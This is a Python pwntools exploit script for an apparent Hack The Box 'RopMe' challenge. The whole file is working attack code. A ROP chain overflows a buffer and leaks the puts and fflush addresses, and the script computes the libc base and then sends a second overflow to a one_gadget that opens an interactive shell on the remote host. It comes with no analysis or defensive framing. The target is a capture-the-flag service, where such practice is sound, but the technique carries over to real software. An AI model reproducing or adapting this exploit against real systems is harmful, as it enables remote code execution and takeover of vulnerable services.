import sys
from pwn import *

_Host = 'docker.hackthebox.eu'

# libc version: libc6_2.23-0ubuntu10_amd64

def _welcome():
    print '''
      ______           ___  ___           
      | ___ \          |  \/  |           
      | |_/ /___  _ __ | .  . | ___       
      |    // _ \| '_ \| |\/| |/ _ \      
      | |\ \ (_) | |_) | |  | |  __/      
      \_| \_\___/| .__/\_|  |_/\___|      
                 | |                      
                 |_|                      
    ______              _____           _ 
    | ___ \            |_   _|         | |
    | |_/ /_      ___ __ | | ___   ___ | |
    |  __/\ \ /\ / / '_ \| |/ _ \ / _ \| |
    | |    \ V  V /| | | | | (_) | (_) | |
    \_|     \_/\_/ |_| |_\_/\___/ \___/|_|
    '''

def _usage(argv):
    print "Usage: python " + sys.argv[0] + " <PORT>"

def _pwn(argv):
    ## port to attack
    _Port=argv[1]

    ## payload to leak info
    _Payload = b"A" * 64
    _Payload += p64(0x600048)  # RBP
    _Payload += p64(0x4006d3)  # pop RDI
    _Payload += p64(0x601018)  # address to leak (puts)
    _Payload += p64(0x4004e0)  # puts plt (in main 40063a)
    _Payload += p64(0x400510)  # flush plt
    _Payload += p64(0x4006d3)  # pop RDI
    _Payload += p64(0x601030)  # address to leak (flush)
    _Payload += p64(0x4004e0)  # puts plt (in main 40063a)
    _Payload += p64(0x400510)  # flush plt
    _Payload += p64(0x4006d3)  # pop RDI
    _Payload += p64(0x400381)  # address to leak (libc version)
    _Payload += p64(0x4004e0)  # puts plt (in main 40063a)
    _Payload += p64(0x400510)  # flush plt
    _Payload += p64(0x400626)  # main
    _Payload += b"\n"

    ## connect
    p = remote(_Host, _Port)

    ## rop me outside
    p.recvline()

    ## send the buffer to leak addresses
    p.send(_Payload)
    _RECV = bytearray(p.recv(4096))
    _PUTS = _RECV[0:6][::-1]
    _FLUSH = _RECV[7:13][::-1]
    _libc = int(hex(unpack(_PUTS, 48, endian='big')) ,16)-0x6f690    
    _one_gadget = _libc + 0x45216    
    print("\n[+] puts offset:    " + hex(unpack(_PUTS, 48, endian='big')))
    print("[+] flush offset:   " + hex(unpack(_FLUSH, 48, endian='big')))
    print("[+] libc offset:    0x{0:x}".format(_libc))
    print("[+] evil offset:    0x{0:x}\n".format(_one_gadget))

    ## evil payload
    _Payload = b"A" * 64
    _Payload += b"a" * 8
    _Payload += p64(_one_gadget)

    ## pwn
    p.send(_Payload)
    p.interactive()

    ## all done
    p.close()

def main(argv):
    _welcome()
    if len(argv) != 2:
        _usage(argv)
        sys.exit(0)
    _Port = sys.argv[1]
    _pwn(argv)

    return 0

if __name__ == '__main__':
    sys.exit(main(sys.argv))
